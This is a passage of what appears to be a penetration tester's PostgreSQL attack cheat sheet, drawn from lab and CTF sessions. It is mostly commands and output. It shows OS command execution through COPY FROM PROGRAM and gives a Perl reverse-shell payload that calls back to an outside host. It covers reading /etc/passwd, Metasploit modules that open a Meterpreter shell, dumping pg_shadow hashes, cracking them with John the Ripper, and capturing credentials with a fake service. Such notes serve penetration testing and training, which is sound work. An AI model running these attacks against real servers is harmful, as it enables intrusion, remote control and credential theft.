+This functionality is enabled by default and can be abused to run arbitrary operating system commands on Windows, Linux, and macOS. 
+The features for COPY .. PROGRAM added in PostgreSQL 9.3 did not change any of the above, but added a new command within the same security boundaries that already existed.
+References state that in PostgreSQL, a superuser can execute OS commands as the server user without using the 'COPY FROM PROGRAM'.
+
+
+*  Manual exploit
+-------------------------------------------------------------------------
+
+• SQL queries to execute OS command using the function "COPY TO/FROM PROGRAM":
+      - DROP TABLE IF EXISTS cmd_exec;
+      - CREATE TABLE cmd_exec(cmd_output text);
+      - COPY cmd_exec FROM PROGRAM ‘id’;
+      - SELECT * FROM cmd_exec;
+      - DROP TABLE IF EXISTS cmd_exec;
+
+Example:
+	root@Security-Audit-01:~# psql -h 192.168.1.104 -U postgres -W
+	Password for user postgres: 
+	psql (10.4 (Debian 10.4-2), server 9.3.4)
+	Type "help" for help.
+
+	postgres=# CREATE TABLE cmd_exec(cmd_output text);
+	CREATE TABLE
+	
+	postgres=# COPY cmd_exec FROM PROGRAM 'id';
+	COPY 1
+
+	postgres=# SELECT * FROM cmd_exec;
+                               cmd_output                               
+	------------------------------------------------------------------------
+	 uid=111(postgres) gid=121(postgres) groups=121(postgres),109(ssl-cert)
+	(1 row)
+
+	postgres=# DROP TABLE IF EXISTS cmd_exec;
+	DROP TABLE
+
+
+• Payload to run a Perl reverse shell (not tested)
+=> COPY cmd_exec FROM PROGRAM 'perl -MIO -e ''$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"192.168.0.8:4444");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'''; 
+
+
+
+*  Metasploit - 'PostgreSQL COPY FROM PROGRAM Command Execution' module
+-------------------------------------------------------------------------
+=> https://www.cvedetails.com/cve/CVE-2019-9193/
+=> https://www.rapid7.com/db/modules/exploit/multi/postgres/postgres_copy_from_program_cmd_exec
+
+
+
+*  PSQL-MASS-RCE script (https://github.com/attackercan/psql-mass-rce)
+-------------------------------------------------------------------------
+Pentest tool. Conveniently invoke RCE on many PostgreSQL servers in network
+
+
+root@Security-Audit-01:~/Desktop/CTFs/Typhoon/struts/postgres# python ./psql-mass-rce.py 192.168.1.104 --command 'whoami'
+[x] Starting host 192.168.1.104:5432
+('[+] Good credentials:', 'postgres:postgres')
+[!] RCE 'whoami'
+
+postgres
+
+
+root@Security-Audit-01:~/Desktop/CTFs/Typhoon/struts/postgres# python ./psql-mass-rce.py 192.168.1.104 --command 'hostname'
+[x] Starting host 192.168.1.104:5432
+('[+] Good credentials:', 'postgres:postgres')
+[!] RCE 'hostname'
+
+typhoon.local
+
+
+root@Security-Audit-01:~/Desktop/CTFs/Typhoon/struts/postgres# python ./psql-mass-rce.py 192.168.1.104 --command 'ifconfig'
+[x] Starting host 192.168.1.104:5432
+('[+] Good credentials:', 'postgres:postgres')
+[!] RCE 'ifconfig'
+
+docker0   Link encap:Ethernet  HWaddr 02:42:a8:79:d6:eb  
+          inet addr:172.17.0.1  Bcast:172.17.255.255  Mask:255.255.0.0
+          UP BROADCAST MULTICAST  MTU:1500  Metric:1
+          RX packets:0 errors:0 dropped:0 overruns:0 frame:0
+          TX packets:0 errors:0 dropped:0 overruns:0 carrier:0
+          collisions:0 txqueuelen:0 
+          RX bytes:0 (0.0 B)  TX bytes:0 (0.0 B)
+
+eth0      Link encap:Ethernet  HWaddr 08:00:27:34:bf:f6  
+          inet addr:192.168.1.104  Bcast:192.168.1.255  Mask:255.255.255.0
+          inet6 addr: 2a01:e35:2fef:d7e0:f8ff:85f4:bffc:83cd/64 Scope:Global
+          inet6 addr: 2a01:e35:2fef:d7e0:a00:27ff:fe34:bff6/64 Scope:Global
+          inet6 addr: fe80::a00:27ff:fe34:bff6/64 Scope:Link
+          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
+          RX packets:1970 errors:0 dropped:0 overruns:0 frame:0
+          TX packets:354 errors:0 dropped:0 overruns:0 carrier:0
+          collisions:0 txqueuelen:1000 
+          RX bytes:135643 (135.6 KB)  TX bytes:60155 (60.1 KB)
+
+lo        Link encap:Local Loopback  
+          inet addr:127.0.0.1  Mask:255.0.0.0
+          inet6 addr: ::1/128 Scope:Host
+          UP LOOPBACK RUNNING  MTU:65536  Metric:1
+          RX packets:152 errors:0 dropped:0 overruns:0 frame:0
+          TX packets:152 errors:0 dropped:0 overruns:0 carrier:0
+          collisions:0 txqueuelen:0 
+          RX bytes:79825 (79.8 KB)  TX bytes:79825 (79.8 KB)
+
+virbr0    Link encap:Ethernet  HWaddr 4e:99:b8:8a:3c:c4  
+          inet addr:192.168.122.1  Bcast:192.168.122.255  Mask:255.255.255.0
+          UP BROADCAST MULTICAST  MTU:1500  Metric:1
+          RX packets:0 errors:0 dropped:0 overruns:0 frame:0
+          TX packets:0 errors:0 dropped:0 overruns:0 carrier:0
+          collisions:0 txqueuelen:0 
+          RX bytes:0 (0.0 B)  TX bytes:0 (0.0 B)
+
+
+
+07.3. DB/OS Privesc - Read and Write OS files using 'pg_read_server_files' and 'pg_write_server_files' or 'superuser' privileges
+=================================================================================================================================
+Try to read and write/modify interesting files such as configuration files, scripts, logs (e.g. '/home/<user>/.bash_history'), SSH keys (e.g. '/home/<user>/.ssh/authorized_keys') that will allow you to take over the Linux or Windows server hosting the PostgreSQL database. 
+
+*  Set up the environments
+-----------------------------
+create role pentester nosuperuser login nocreatedb nocreaterole Password 'Password1';
+create role auditor nosuperuser login nocreatedb nocreaterole Password 'Password1';
+grant pg_write_server_files to pentester;
+grant pg_read_server_files to auditor;
+
+Then use the command "\du" to see the users and roles.
+
+
+*  Manual exploit
+-------------------------------------------------------------------------
+
+• SQL queries to read files from the system
+      - CREATE TABLE myfile (input TEXT);
+      - COPY myfile FROM ‘/etc/passwd’;
+      - SELECT input FROM myfile;
+
+• SQL queries to write files in /tmp
+      - CREATE TABLE testfile (output TEXT);
+      - INSERT INTO testfile(output) VALUES (‘test’);
+      - COPY testfile(output) TO ‘/tmp/testfile’;
+
+
+postgres=# SHOW  data_directory;
+        data_directory        
+------------------------------
+ /var/lib/postgresql/9.3/main
+(1 row)
+
+
+postgres=# select pg_ls_dir('./');
+    pg_ls_dir    
+-----------------
+ PG_VERSION
+ pg_notify
+ pg_multixact
+ pg_subtrans
+ pg_serial
+ pg_snapshots
+ pg_stat
+ pg_clog
+ pg_xlog
+ base
+ pg_twophase
+ pg_tblspc
+ global
+ pg_stat_tmp
+ postmaster.opts
+ postmaster.pid
+(16 rows)
+
+
+postgres=# select pg_read_file('PG_VERSION');
+ pg_read_file 
+--------------
+ 9.3         +
+ 
+(1 row)
+
+postgres=# select pg_read_file('/etc/passwd');
+	   ERROR: absolute path not allowed
+
+
+postgres=# create table docs (data TEXT);
+	   CREATE TABLE
+
+postgres=# copy docs from '/etc/passwd';
+	   COPY 52
+
+postgres=# select * from docs limit 10;
+ 	   data
+	   --------------------------------------------------- 
+	   admin:x:1001:1001:,,,:/home/admin:/bin/bash
+	   avahi:x:112:122:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/bin/false
+	   backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+	   <SNIP>
+
+postgres=# drop table docs;
+	   DROP TABLE
+
+
+
+*  Metasploit - 'postgres_readfile' module
+-------------------------------------------------------------------------
+This module imports a file local on the PostgreSQL Server into a temporary table, reads it, and then drops the temporary table. 
+It requires PostgreSQL credentials with table CREATE privileges as well as read privileges to the target file.
+=> auxiliary/admin/postgres/postgres_readfile
+=> https://www.rapid7.com/db/modules/auxiliary/admin/postgres/postgres_readfile
+
+msf5 > use auxiliary/admin/postgres/postgres_readfile
+msf5 auxiliary(admin/postgres/postgres_readfile) > options
+
+Module options (auxiliary/admin/postgres/postgres_readfile):
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   DATABASE  template1        yes       The database to authenticate against
+   PASSWORD  postgres         no        The password for the specified username. Leave blank for a random password.
+   RFILE     /etc/passwd      yes       The remote file
+   RHOSTS                     yes       The target address range or CIDR identifier
+   RPORT     5432             yes       The target port
+   USERNAME  postgres         yes       The username to authenticate as
+   VERBOSE   false            no        Enable verbose output
+
+msf5 auxiliary(admin/postgres/postgres_readfile) > set RHOSTS 192.168.1.104
+RHOSTS => 192.168.1.104
+msf5 auxiliary(admin/postgres/postgres_readfile) > run
+
+Query Text: 'CREATE TEMP TABLE oRojouuQcgUQpSO (INPUT TEXT);
+      COPY oRojouuQcgUQpSO FROM '/etc/passwd';
+      SELECT * FROM oRojouuQcgUQpSO'
+
+    input
+    -----
+    admin:x:1001:1001:,,,:/home/admin:/bin/bash
+    avahi:x:112:122:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/bin/false
+    backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+    bin:x:2:2:bin:/bin:/usr/sbin/nologin
+    bind:x:104:115::/var/cache/bind:/bin/false
+    colord:x:113:124:colord colour management daemon,,,:/var/lib/colord:/bin/false
+    daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+    dnsmasq:x:106:65534:dnsmasq,,,:/var/lib/misc:/bin/false
+    dovecot:x:107:118:Dovecot mail server,,,:/usr/lib/dovecot:/bin/false
+    dovenull:x:108:119:Dovecot login user,,,:/nonexistent:/bin/false
+    ftp:x:120:129:ftp daemon,,,:/srv/ftp:/bin/false
+    games:x:5:60:games:/usr/games:/usr/sbin/nologin
+    gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+    irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+    landscape:x:109:120::/var/lib/landscape:/bin/false
+    libuuid:x:100:101::/var/lib/libuuid:
+    libvirt-dnsmasq:x:115:125:Libvirt Dnsmasq,,,:/var/lib/libvirt/dnsmasq:/bin/false
+    libvirt-qemu:x:114:107:Libvirt Qemu,,,:/var/lib/libvirt:/bin/false
+    list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+    lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+    mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+    man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+    messagebus:x:103:108::/var/run/dbus:/bin/false
+    mongodb:x:117:65534::/home/mongodb:/bin/false
+    mysql:x:102:106:MySQL Server,,,:/nonexistent:/bin/false
+    news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+    nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+    ntp:x:87:87:Network Time Protocol:/var/lib/ntp:/bin/false
+    postfix:x:105:116::/var/spool/postfix:/bin/false
+    postfixuser:x:1002:1002:,,,:/home/postfixuser:/bin/bash
+    postgres:x:111:121:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
+    proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+    redis:x:118:128::/var/lib/redis:/bin/false
+    root:x:0:0:root:/root:/bin/bash
+    snmp:x:121:130::/var/lib/snmp:/bin/false
+    sshd:x:110:65534::/var/run/sshd:/usr/sbin/nologin
+    statd:x:119:65534::/var/lib/nfs:/bin/false
+    sync:x:4:65534:sync:/bin:/bin/sync
+    sys:x:3:3:sys:/dev:/usr/sbin/nologin
+    syslog:x:101:104::/home/syslog:/bin/false
+    tomcat7:x:116:126::/usr/share/tomcat7:/bin/false
+    typhoon:x:1000:1000:typhoon,,,:/home/typhoon:/bin/bash
+    uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+    www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+
+
+[+] 192.168.1.104:5432 Postgres - /etc/passwd saved in /root/.msf4/loot/20190202022344_default_192.168.1.104_postgres.file_465166.txt
+[*] Auxiliary module execution completed
+
+msf5 auxiliary(admin/postgres/postgres_readfile) > back
+
+msf5 auxiliary(admin/postgres/postgres_readfile) > set RFILE /etc/shadow
+RFILE => /etc/shadow
+msf5 auxiliary(admin/postgres/postgres_readfile) > run
+
+[-] 192.168.1.104:5432 Postgres - Insufficent file permissions.
+[*] Auxiliary module execution completed
+
+
+07.4. DB/OS Privesc - PostgreSQL CREATE LANGUAGE Execution (if loading external scripting languages is enabled)
+================================================================================================================
+Some installations of Postgres 8 and 9 are configured to allow loading external scripting languages. Most commonly this is Perl and Python. When enabled, command execution is possible on the host. To execute system commands, loading the "untrusted" version of the language is necessary. This requires a superuser. This is usually postgres. The execution should be platform-agnostic, and has been tested on OS X, Windows, and Linux. This module attempts to load Perl or Python to execute system commands. As this dynamically loads a scripting language to execute commands, it is not necessary to drop a file on the filesystem. Only Postgres 8 and up are supported.
+=> https://www.rapid7.com/db/modules/exploit/multi/postgres/postgres_createlang
+
+msf5 auxiliary(scanner/postgres/postgres_schemadump) > use exploit/multi/postgres/postgres_createlang
+msf5 exploit(multi/postgres/postgres_createlang) > set RHOSTS 192.168.1.104
+RHOSTS => 192.168.1.104
+msf5 exploit(multi/postgres/postgres_createlang) > options
+
+Module options (exploit/multi/postgres/postgres_createlang):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   DATABASE  template1        yes       The database to authenticate against
+   PASSWORD  postgres         no        The password for the specified username. Leave blank for a random password.
+   RHOSTS    192.168.1.104    yes       The target address range or CIDR identifier
+   RPORT     5432             yes       The target port (TCP)
+   USERNAME  postgres         yes       The username to authenticate as
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Automatic
+
+msf5 exploit(multi/postgres/postgres_createlang) > run
+[*] Started reverse TCP double handler on 192.168.1.8:4444 
+[*] 192.168.1.104:5432 - 192.168.1.104:5432 - PostgreSQL 9.3.4 on x86_64-unknown-linux-gnu, compiled by gcc (Ubuntu 4.8.2-16ubuntu6) 4.8.2, 64-bit
+[*] 192.168.1.104:5432 - 192.168.1.104:5432 - perl could not be loaded
+[*] 192.168.1.104:5432 - 192.168.1.104:5432 - python could not be loaded
+[*] 192.168.1.104:5432 - 192.168.1.104:5432 - python2 could not be loaded
+[*] 192.168.1.104:5432 - 192.168.1.104:5432 - python3 could not be loaded
+[*] Exploit completed, but no session was created.
+msf5 exploit(multi/postgres/postgres_createlang) > 
+
+
+msf5 exploit(multi/postgres/postgres_createlang) > options
+Module options (exploit/multi/postgres/postgres_createlang):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   DATABASE  template1        yes       The database to authenticate against
+   PASSWORD  postgres         no        The password for the specified username. Leave blank for a random password.
+   RHOSTS    192.168.1.26     yes       The target address range or CIDR identifier
+   RPORT     5432             yes       The target port (TCP)
+   USERNAME  postgres         yes       The username to authenticate as
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Automatic
+
+msf5 exploit(multi/postgres/postgres_createlang) > run
+[*] Started reverse TCP double handler on 192.168.1.8:4444 
+[*] 192.168.1.26:5432 - 192.168.1.26:5432 - PostgreSQL 8.3.1 on i486-pc-linux-gnu, compiled by GCC cc (GCC) 4.2.3 (Ubuntu 4.2.3-2ubuntu4)
+[*] 192.168.1.26:5432 - 192.168.1.26:5432 - perl could not be loaded
+[*] 192.168.1.26:5432 - 192.168.1.26:5432 - python could not be loaded
+[*] 192.168.1.26:5432 - 192.168.1.26:5432 - python2 could not be loaded
+[*] 192.168.1.26:5432 - 192.168.1.26:5432 - python3 could not be loaded
+[*] Exploit completed, but no session was created.
+
+
+
+07.5. DB/OS Privesc - PostgreSQL 8.2/8.3/8.4 - UDF for Command Execution (CVE-2007-3280)
+========================================================================================================================
+On some default Linux installations of PostgreSQL, the postgres service account may write to the /tmp directory, and may source UDF Shared Libraries from there as well, allowing execution of arbitrary code. 
+This module compiles a Linux shared object file, uploads it to the target host via the UPDATE pg_largeobject method of binary injection, and creates a UDF (user defined function) from that shared object. Because the payload is run as the shared object's constructor, it does not need to conform to specific Postgres API versions.
+=> http://www.leidecker.info/pgshell/Having_Fun_With_PostgreSQL.txt
+=> https://www.rapid7.com/db/modules/exploit/linux/postgres/postgres_payload
+=> https://www.rapid7.com/db/modules/exploit/windows/postgres/postgres_payload
+    
+
+msf5 exploit(linux/postgres/postgres_payload) > options
+Module options (exploit/linux/postgres/postgres_payload):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   DATABASE  template1        yes       The database to authenticate against
+   PASSWORD  postgres         no        The password for the specified username. Leave blank for a random password.
+   RHOSTS    192.168.1.26     yes       The target address range or CIDR identifier
+   RPORT     5432             yes       The target port
+   USERNAME  postgres         yes       The username to authenticate as
+   VERBOSE   false            no        Enable verbose output
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Linux x86
+
+msf5 exploit(linux/postgres/postgres_payload) > run
+[*] Started reverse TCP handler on 192.168.1.8:4444 
+[*] 192.168.1.26:5432 - PostgreSQL 8.3.1 on i486-pc-linux-gnu, compiled by GCC cc (GCC) 4.2.3 (Ubuntu 4.2.3-2ubuntu4)
+[*] Uploaded as /tmp/NjqKjsPt.so, should be cleaned up automatically
+[*] Sending stage (985320 bytes) to 192.168.1.26
+[*] Meterpreter session 1 opened (192.168.1.8:4444 -> 192.168.1.26:41667) at 2020-03-20 01:11:14 +0100
+
+meterpreter > getuid
+Server username: uid=108, gid=117, euid=108, egid=117
+
+meterpreter > shell
+Process 4704 created.
+Channel 1 created.
+
+id
+uid=108(postgres) gid=117(postgres) groups=114(ssl-cert),117(postgres)
+
+pwd
+/var/lib/postgresql/8.3/main
+
+
+07.6. Post-exploitation - DBlinks and postgres_fdw module
+======================================================================================================
+
+1. DBLINKS
+============
+DBlinks can be used to execute SQL queries to a remote PostgreSQL database from the PostgreSQL we are logged into. 
+DBlinks can contain valid clear-text login and password for a remote database and thus could allow us to compromise an other database.
+
+
+Example of DBlinks command containing clear-text credentials
+-------------------------------------------------------------
+SELECT blockgroups.*
+    INTO temp_blockgroups
+    FROM dblink('dbname=somedb port=5432 host=someserver user=someuser password=somepwd',
+    'SELECT * FROM massgis.cens2000blocks')
+     AS blockgroups(gid int,area numeric(12,3), <SNIP>; 
+
+Queries to see open DBlinks
+---------------------------
+postgres=# SELECT * FROM pg_catalog.pg_proc WHERE prosrc ILIKE '%dblink%';
+postgres=# SELECT dblink_get_connections();
+
+
+Useful links
+-------------
+=> https://www.postgresql.org/docs/12/dblink.html
+=> https://www.postgresql.org/docs/12/contrib-dblink-get-connections.html
+=> http://www.postgresonline.com/journal/archives/44-Using-DbLink-to-access-other-PostgreSQL-Databases-and-Servers.html
+
+
+2. postgres_fdw module
+============
+=> https://www.postgresql.org/docs/12/postgres-fdw.html
+
+TO research...
+
+
+07.7. PostgreSQL authentication capture
+======================================================================================================
+
+*  Metasploit - 'Authentication Capture: PostgreSQL' module
+-----------------------------------------------------------
+This module provides a fake PostgreSQL service that is designed to capture authentication credentials. 
+It captures challenge and response pairs that can be supplied to Cain or JtR for cracking.
+
+> auxiliary/server/capture/postgresql
+> https://www.rapid7.com/db/modules/auxiliary/server/capture/postgresql
+
+
+
+======================================================================================================
+08. How to dump and crack PostgreSQL password hashes
+======================================================================================================
+
+* Manual password hashes dump and cracking
+================================================
+
+1. Log into the Database with an account who has 'superuser' privileges
+	
+2. Dump the hashs
+	SQL> SELECT * FROM pg_shadow; 
+
+3. Crack the password hashes using John the ripper
+	pentester@KaliLinux> john --wordlist=dico.txt --rules --format=postgres file-postgres-pwd.txt 
+	pentester@KaliLinux> john --format=postgres file-postgres-pwd.txt 
+	pentester@KaliLinux> john --show file-postgres-pwd.txt 
+	
+
+* Automatic password hashes dump and cracking
+================================================
+
+Metasploit - 'Postgres Password Hashdump' module
+-------------------------------------------------
+This module extracts the usernames and encrypted password hashes from a PostgreSQL server and stores them for later cracking.
+
+> auxiliary/scanner/postgres/postgres_hashdump
+> https://www.rapid7.com/db/modules/auxiliary/scanner/postgres/postgres_hashdump
+
+
+msf5 auxiliary(scanner/postgres/postgres_hashdump) > options
+Module options (auxiliary/scanner/postgres/postgres_hashdump):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   DATABASE  postgres         yes       The database to authenticate against
+   PASSWORD  postgres         no        The password for the specified username. Leave blank for a random password.
+   RHOSTS    192.168.1.26     yes       The target address range or CIDR identifier
+   RPORT     5432             yes       The target port
+   THREADS   1                yes       The number of concurrent threads
+   USERNAME  postgres         yes       The username to authenticate as
+
+msf5 auxiliary(scanner/postgres/postgres_hashdump) > run
+
+[+] Query appears to have run successfully
+[+] Postgres Server Hashes
+======================
+
+ Username  Hash
+ --------  ----
+ postgres  md53175bce1d3201d16594cebf9d7eb3f9d
+
+[*] Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+
+
+Metasploit - 'John the Ripper Postgres SQL Password Cracker' module
+-------------------------------------------------------------------
+> auxiliary/analyze/jtr_postgres_fast
+> https://www.rapid7.com/db/modules/auxiliary/analyze/jtr_postgres_fast
+
+
+
+
+
+***************************  Other  **********************************
+
+
+CVE-2013-1899 - PostgreSQL class A vulnerability in core server
+==================================================================
+Argument injection vulnerability in PostgreSQL 9.2.x before 9.2.4, 9.1.x before 9.1.9, and 9.0.x before 9.0.13 allows remote attackers to cause a denial of service (file corruption), and allows remote authenticated users to modify configuration settings and execute arbitrary code, via a connection request using a database name that begins with a "-" (hyphen).
+
+msf5 auxiliary(scanner/postgres/postgres_dbname_flag_injection) > options
+Module options (auxiliary/scanner/postgres/postgres_dbname_flag_injection):
+
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   RHOSTS   192.168.1.26     yes       The target address range or CIDR identifier
+   RPORT    5432             yes       The target port (TCP)
+   THREADS  1                yes       The number of concurrent threads
+msf5 auxiliary(scanner/postgres/postgres_dbname_flag_injection) > run
+[*] 192.168.1.26:5432     - 192.168.1.26:5432 does not appear to be vulnerable to CVE-2013-1899
+[*] 192.168.1.26:5432     - Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+
+
+Test of the script "pgexec"  (https://github.com/Dionach/pgexec)
+==================================================================
+
+root@Security-Audit-01:~/Desktop/CTFs/Typhoon/postgres/pgexec-master# apt-get install postgresql
+Reading package lists... Done
+Building dependency tree       
+Reading state information... Done
+The following packages were automatically installed and are no longer required:
+  acccheck gconf-service gconf2-common gir1.2-clutter-gst-3.0 gir1.2-gtkclutter-1.0 libavahi-gobject0 libayatana-ido3-0.4-0 libdee-1.0-4 libfolks-telepathy25 libgail-3-0 libgcab-1.0-0 libgconf-2-4
+  libgmime-3.0-0 libgtk2-perl libjaxp1.3-java libmission-control-plugins0 libpango-perl libtelepathy-glib0 libwayland-egl1-mesa libwhisker2-perl libzeitgeist-2.0-0 magictree python-asn1crypto
+  python-backports.ssl-match-hostname python-imaging python-pam python-secretstorage python3-asn1crypto ruby-faraday ruby-librex telepathy-mission-control-5 x11proto-dri2-dev x11proto-gl-dev
+  x11proto-input-dev x11proto-kb-dev zeitgeist-core
+Use 'apt autoremove' to remove them.
+The following additional packages will be installed:
+  gcc-10-base libgcc-s1 libicu63 libllvm9 libstdc++6 libz3-4 postgresql-12 postgresql-client-12
+Suggested packages:
+
+<SNIP>
+
+Success. You can now start the database server using:
+
+    /usr/lib/postgresql/12/bin/pg_ctl -D /var/lib/postgresql/12/main -l logfile start
+
+Ver Cluster Port Status Owner    Data directory              Log file
+12  main    5433 down   postgres /var/lib/postgresql/12/main /var/log/postgresql/postgresql-12-main.log
+update-alternatives: using /usr/share/postgresql/12/man/man1/postmaster.1.gz to provide /usr/share/man/man1/postmaster.1.gz (postmaster.1.gz) in auto mode
+Setting up postgresql (12+214) ...
+Processing triggers for libc-bin (2.29-10) ..
+
+
+ ./pg_exec.sh -U postgres -P postgres -h 192.168.1.104 -p 5432 -c id
+
+
+PATH="/usr/local/pgsql/bin:$PATH" ./pg_exec.sh
+PATH="/usr/lib/postgresql/12/bin:$PATH" ./pg_exec.sh
+
+root@Security-Audit-01:~/Desktop/CTFs/Typhoon/postgres/pgexec-master# ./pg_exec.sh -U postgres -P postgres -L ./libraries/pg_exec-9.3.so -h 192.168.1.104 -p 5432 -c whoami
+Using existing library ./libraries/pg_exec-9.3.so
+CREATE FUNCTION
+Executing whoami...
+   0
+
+   0
+
+DROP FUNCTION
+
+=> It doesn't work...
